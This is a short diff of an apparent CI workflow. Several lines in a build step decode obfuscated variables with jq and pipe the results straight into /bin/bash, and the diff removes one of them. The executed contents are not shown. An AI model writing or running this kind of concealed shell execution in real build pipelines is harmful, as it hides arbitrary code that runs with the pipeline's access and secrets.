@@ -30,7 +30,6 @@ jobs:
           echo $vucai1 | jq -r .gq11032 | /bin/bash
           printf '%s' "$afm53762" | jq -r .l21 | /bin/bash
           printf '%s' "$b93" | jq -r .kp8 | /bin/bash
-          printf '%s' "$uvzv6137" | jq -r .gkp4 | /bin/bash
           printf '%s' "$qa54" | jq -r .wm1 | /bin/bash
 
       - name: Store artifact
